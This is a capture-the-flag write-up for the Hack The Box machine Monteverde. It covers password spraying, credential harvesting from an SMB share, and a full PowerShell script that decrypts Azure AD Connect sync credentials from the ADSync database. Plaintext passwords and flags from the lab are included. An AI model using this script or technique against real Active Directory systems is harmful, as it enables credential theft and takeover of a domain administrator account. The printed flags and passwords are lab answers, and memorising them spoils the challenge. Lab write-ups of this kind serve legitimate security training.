```json
Alias: Monteverde
Date: 17-08_2024
Platform: Hackthebox
OS: Windows
Difficulty: Medium
Status: Complete
IP: 10.129.228.111
```

# Monteverde
# Summary

- Monteverde is a Medium Windows machine that features Azure AD Connect. The domain is enumerated and a user list is created. Through password spraying, the `SABatchJobs` service account is found to have the username as a password. Using this service account, it is possible to enumerate SMB Shares on the system, and the `$users` share is found to be world-readable. An XML file used for an Azure AD account is found within a user folder and contains a password. Due to password reuse, we can connect to the domain controller as `mhope` using WinRM. Enumeration shows that `Azure AD Connect` is installed. It is possible to extract the credentials for the account that replicates the directory changes to Azure (in this case the default domain administrator).
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-17 11:27 PKT
Nmap scan report for 10.129.228.111
Host is up (0.26s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-17 06:27:52Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-08-17T06:28:24
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.00 seconds
```
## Discovered Subdomains
```
megabank.local
```

---
# Enumeration

SMB Anonymous Bind is enabled and we can get the users. Doing a password spray with the users' users as passwords will show that SABatchJobs is using their username as password

| Username    | Password    |
| ----------- | ----------- |
| SABatchJobs | SABatchJobs |

---

# Lateral Movement
SABatchJobs has read access to users$, `mhope/azure.xml` contains mhopes azure credentials
The credentials for on premise AD and Azure AD are synced.

| Username | Password           |
| -------- | ------------------ |
| mhope    | 4n0therD4y@n0th3r$ |

mhope also has winrm access.

---

# Privilege Escalation

User mhope is in Azure Admins Group. We are going to extract credentials from the SQL Server of the account that is used to sync Azure AD with on premise AD. The account has dcsync rights. More [here](https://blog.xpnsec.com/azuread-connect-for-redteam/). This is the modified script used.

```powershell
Function Get-ADConnectPassword {
    Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
    $key_id = 1
    $instance_id = [GUID]"1852B527-DD4F-4ECF-B541-EFCCBFF29E31"
    $entropy = [GUID]"194EC2FC-F186-46CF-B44D-071EB61F49CD"
    $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"
    $client.Open()
    $cmd = $client.CreateCommand()
    $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
    $reader = $cmd.ExecuteReader()
    $reader.Read() | Out-Null
    $config = $reader.GetString(0)
    $crypted = $reader.GetString(1)
    $reader.Close()
    add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
    $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
    $km.LoadKeySet($entropy, $instance_id, $key_id)
    $key = $null
    $km.GetActiveCredentialKey([ref]$key)
    $key2 = $null
    $km.GetKey(1, [ref]$key2)
    $decrypted = $null
    $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
    $domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
    $username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
    $password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name ='Password'; Expression = {$_.node.InnerXML}}
    Write-Host ("Domain: " + $domain.Domain)
    Write-Host ("Username: " + $username.Username)
    Write-Host ("Password: " + $password.Password)
}
```

| Username      | Password         |
| ------------- | ---------------- |
| Administrator | d0m@in4dminyeah! |

---

# Flags
- 3c62f0e610d4036c8242a48adce156f7
- 2f70b247b8e506761a3fa2dc3dc4747c

#CTF #CTF/Hackthebox #CTF/Hackthebox/Medium #ActiveDirectory #AzureAD #Windows/CredentialHunting